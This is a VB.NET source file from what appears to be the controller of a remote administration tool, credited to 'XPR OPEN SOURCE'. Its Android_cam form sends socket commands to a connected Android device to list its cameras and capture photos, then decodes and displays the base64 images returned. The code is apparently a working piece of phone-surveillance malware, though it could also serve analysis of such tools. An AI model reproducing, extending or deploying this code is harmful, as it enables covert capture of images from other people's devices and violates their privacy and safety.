Public Class Android_cam
    Public sock As Integer
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Private Sub Android_cam_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        '"camera_manager_stop"
        Form1.Server.Send_DX(sock, "camera_manager_stop" & SplitData)
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        'refresh drivers
        'or get drivers
        ComboBox1.Items.Clear()
        Form1.Server.Send_DX(sock, "camera_manager_find_camera" & SplitData)
    End Sub
    Private Function SetParameters() As String
        Dim str2 As String = Nothing
        'Try

        '    str2 = str2 & "0"
        '    str2 = str2 & "0"
        '    str2 = str2 & "1"
        '    str2 = str2 & "1"



        'Finally

        'End Try
        'Try

        '    str2 = str2 & "0"
        '    str2 = str2 & "0"
        '    str2 = str2 & "1"
        '    str2 = str2 & "0"

        'Finally

        'End Try
        'Try

        '    str2 = str2 & "0"
        '    str2 = str2 & "0"
        '    str2 = str2 & "1"
        '    str2 = str2 & "0"

        'Finally

        'End Try
        Try


            str2 = str2 & "0"
            str2 = str2 & "0"
            str2 = str2 & "1"
            str2 = str2 & "0"



        Finally

        End Try
        Return str2
    End Function

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        'capture "camera_manager_capture"
        Dim camDRV As String = "Null"
        camDRV = ComboBox1.SelectedItem.ToString
        If camDRV.Equals("Null") Or camDRV.Length < 2 Then
            MsgBox("Choose a Camera Driver to Capture from", MsgBoxStyle.Exclamation)
            Exit Sub
        Else
            If camDRV.Length > 2 Then
                If NumericUpDown1.Value > 25 Then
                    Form1.Server.Send_DX(sock, "camera_manager_capture" & SplitData & Split(camDRV, ":")(1) & SplitData & NumericUpDown1.Value & SplitData & SetParameters() & SplitData)
                End If

            End If

        End If


    End Sub

    'Public split_Ary As String = "c0c1c3a2c0c1c"
    'Public split_Line As String = "9xf89fff9xf89"
    'Public Split_Packets As String = "b4x7004x700x4b" 
    'Public split_paths As String = "e1x1114x61114e"
    'Public SplitData As String = "fxf0x4x4x0fxf"  

    'Public Syn As String = "c2x2824x828200x0c"  
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Protected Friend Sub Raised_Data(ByVal stringdata As String)

        If stringdata.Contains(Split_Packets) Then
            stringdata = stringdata.Replace(Split_Packets, "sblj01")
        End If
        If stringdata.Contains(split_Ary) Then
            stringdata = stringdata.Replace(split_Ary, "sblj01")
        End If
        If stringdata.Contains(SplitData) Then
            stringdata = stringdata.Replace(SplitData, "sblj01")
        End If
        Dim RESX_ARY As String() = Split(stringdata, "||")
        Dim RESX_ARY_STR As String = RESX_ARY(2)
        Dim REFORM_ARY As String() = Split(RESX_ARY_STR, "sblj01")


        If RESX_ARY(1).Length < 1 Or RESX_ARY(1).Length < 2 Then
            ComboBox1.Enabled = False
            MsgBox("No Camera Detected in the Device", MsgBoxStyle.Critical)
            Button2.Enabled = False
        Else
            If RESX_ARY(1).Contains("ron") Or RESX_ARY(1).Contains("ack") Then
                Dim Drives_C As String = RESX_ARY(1)
                Dim DEVARY As String() = Split(Drives_C, split_Line)
                For Each DRV_N As String In DEVARY
                    If DRV_N.Contains("Camera") Then
                        Dim DRV_N1 As String() = Split(DRV_N, "sblj01")
                        Dim c_name As String = DRV_N1(0)
                        Dim c_index As String = DRV_N1(1)

                        If ComboBox1.Items.Contains(c_name & ":" & c_index & ":") = False Then
                            ComboBox1.Items.Add(c_name & ":" & c_index & ":")
                        End If
                    End If
                Next
            Else
                If RESX_ARY(2).Contains("TookPicture") Or RESX_ARY(2).Equals("ITookPicture") Then
                    Dim BASE64IMG As String = RESX_ARY(1) : MsgBox(stringdata)
                    Try
                        Dim camIMG As System.Drawing.Image = System.Drawing.Image.FromStream(New System.IO.MemoryStream(Convert.FromBase64String(BASE64IMG)))
                        PictureBox1.Image = camIMG
                    Catch ex As Exception
                    End Try
                End If
               
            End If
         
        End If
        'Select Case REFORM_ARY(0)
        '    Case "IFoundCamera"

        '        Dim indC As Integer = 0
        '        For Each xx As String In RESX_ARY

        '        Next
        '    Case "Back Camera"
        '        ComboBox1.Items.Add("Back Camera")


        '    Case "ITookPicture"
        '        MsgBox("000000000000000000000000000000000000000000000000000000000000000000000000000000000")
        'End Select
    End Sub

    Private Sub Android_cam_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Button1.PerformClick()
    End Sub
End Class